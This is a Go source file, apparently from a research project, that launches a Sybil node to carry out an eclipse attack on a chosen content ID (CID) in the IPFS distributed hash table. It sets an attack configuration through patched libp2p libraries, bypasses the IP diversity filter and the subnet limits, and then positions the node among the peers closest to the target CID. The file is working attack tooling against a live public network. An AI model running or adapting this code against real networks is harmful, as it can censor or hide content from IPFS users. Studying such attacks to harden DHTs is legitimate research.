package main

import (
	"context"
	"flag"
	"fmt"
	gocid "github.com/ipfs/go-cid"
	"github.com/ipfs/kubo/core"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/peer"
	rcmgr "github.com/libp2p/go-libp2p/p2p/host/resource-manager"
	"github.com/vicnetto/active-sybil-attack/logger"
	ipfspeer "github.com/vicnetto/active-sybil-attack/node/peer"
	"os"
	"os/signal"
	"sybil/friends"
	"syscall"
)

var log = logger.InitializeLogger()

type FlagConfig struct {
	isActive *bool

	privateKey     *string
	eclipsedCid    *string
	ip             *string
	port           int
	sybilsFilePath *string
}

func help() func() {
	return func() {
		fmt.Println("Usage: ./sybil [flags]:")
		fmt.Println(" A mode must be specified:")
		fmt.Println("    -active               -- Enables active behavior.")
		fmt.Println("    -passive              -- Enables passive behavior.")
		fmt.Println(" Global flags:")
		fmt.Println("    -privateKey <string>  -- Private key.")
		fmt.Println("    -cid <string>         -- Eclipsed CID.")
		fmt.Println("    -port <int>           -- Port on which the sybil will be executed.")
		fmt.Println("    -ip <string>          -- IP address to use.")
		fmt.Println("    -sybils <string>      -- Path to a file containing information about other sybils to " +
			"connect to (file format: pkey pid port) (optional).")
	}
}

func treatFlags() *FlagConfig {
	flagConfig := FlagConfig{}

	flagConfig.isActive = flag.Bool("active", false, "")
	isPassive := flag.Bool("passive", false, "")

	flagConfig.privateKey = flag.String("privateKey", "", "")
	flagConfig.ip = flag.String("ip", "", "")
	flagConfig.eclipsedCid = flag.String("cid", "", "")
	flagConfig.sybilsFilePath = flag.String("sybils", "", "")
	flag.IntVar(&flagConfig.port, "port", 0, "")

	flag.Usage = help()

	flag.Parse()

	missingFlag := false

	if (!*flagConfig.isActive && !*isPassive) || (*flagConfig.isActive == true && *isPassive == true) {
		log.Info.Println("error: one mode should be specified.")
		missingFlag = true
	}

	if len(*flagConfig.privateKey) == 0 {
		log.Info.Println("error: flag privateKey missing.")
		missingFlag = true
	}

	if len(*flagConfig.eclipsedCid) == 0 {
		log.Info.Println("error: flag cid missing.")
		missingFlag = true
	}

	if len(*flagConfig.ip) == 0 {
		log.Info.Println("error: flag ip missing.")
		missingFlag = true
	}

	if flagConfig.port == 0 {
		log.Info.Println("error: flag port missing.")
		missingFlag = true
	}

	if missingFlag {
		log.Info.Println()
		flag.Usage()
		os.Exit(1)
	}

	return &flagConfig
}

func main() {
	flagConfig := treatFlags()

	ctx, cancel := context.WithCancel(context.Background())

	sybilConfig := ipfspeer.ConfigForSybil(flagConfig.ip, flagConfig.port, *flagConfig.privateKey)

	log.Info.Println("Initializing sybil with following parameters:")
	log.Info.Println(" PeerID:", sybilConfig.Identity.PeerID)
	log.Info.Println(" Port:", sybilConfig.Port)
	log.Info.Println(" Eclipsed CID:", *flagConfig.eclipsedCid)
	log.Info.Println(" Active mode:", *flagConfig.isActive, "\n")

	var otherSybils []peer.AddrInfo
	if len(*flagConfig.sybilsFilePath) != 0 {
		otherSybils = friends.ReadOtherPeersAsPeerInfo(*flagConfig.sybilsFilePath, sybilConfig.Identity.PrivKey, *sybilConfig.Ip)
	}

	nodeApi, node, err := ipfspeer.SpawnEphemeral(ctx, sybilConfig)
	if err != nil {
		panic(err)
	}

	// Set attack configuration to avoid IP filters and specify the CID to be eclipsed
	dht.SetAttackConfiguration(*flagConfig.eclipsedCid, *flagConfig.isActive, otherSybils)
	dht.SetGroupToBypassDiversityFilter(friends.ExtractGroupFromIp(*flagConfig.ip))
	rcmgr.SetAllowedIpForSubnetLimit(*flagConfig.ip)

	decode, err := gocid.Decode(*flagConfig.eclipsedCid)
	if err != nil {
		log.Info.Println("error: invalid CID passed as parameter.")
		log.Info.Println(err)
		return
	}

	// Get closest peers to establish the node in the network
	peers, err := node.DHT.WAN.GetClosestPeers(ctx, string(decode.Hash()))
	log.Info.Printf("Closest peers to %s: %q\n\n", decode.String(), peers)

	myAddresses, err := nodeApi.Swarm().ListenAddrs(ctx)
	log.Info.Println("My addresses:", myAddresses, "\n")

	// Only if has other sybils to connect
	// if len(otherSybils) != 0 {
	// 	duration := time.Duration(5*len(otherSybils)) * time.Second
	// 	log.Info.Println("Sleeping for", duration, "before connecting to other sybils...", "\n")

	// 	time.Sleep(duration)
	// 	friends.ConnectToOtherSybils(ctx, nodeApi, node, otherSybils)
	// }

	run(node, cancel)
}

func run(node *core.IpfsNode, cancel func()) {
	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM)
	<-c

	log.Info.Printf("Exiting...\n")

	cancel()

	if err := node.Close(); err != nil {
		panic(err)
	}

	return
}
